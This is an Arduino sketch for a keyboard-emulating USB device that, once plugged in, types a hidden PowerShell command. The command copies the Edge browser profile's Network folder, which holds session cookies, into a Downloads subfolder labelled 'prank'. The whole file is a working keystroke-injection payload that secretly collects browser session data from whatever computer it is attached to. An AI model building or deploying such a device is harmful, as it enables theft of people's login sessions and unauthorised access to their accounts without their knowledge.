#include <Keyboard.h>

void setup() {
  // Initialize the keyboard
  Keyboard.begin();

  // Delay to ensure the computer recognizes the device
  delay(5000);

  // Simulate pressing the Windows key and R to open the Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);

  // Type the command to open hidden PowerShell
  Keyboard.print("powershell -WindowStyle Hidden -Command \"mkdir $Env:USERPROFILE\\Downloads\\prank -Force; robocopy '$Env:USERPROFILE\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network' '$Env:USERPROFILE\\Downloads\\prank' /E /NFL /NDL /NJH /NJS /nc /ns /np\"");
  delay(500);

  // Simulate pressing Enter
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // End the keyboard simulation
  Keyboard.end();
}

void loop() {
  // Nothing to do here
}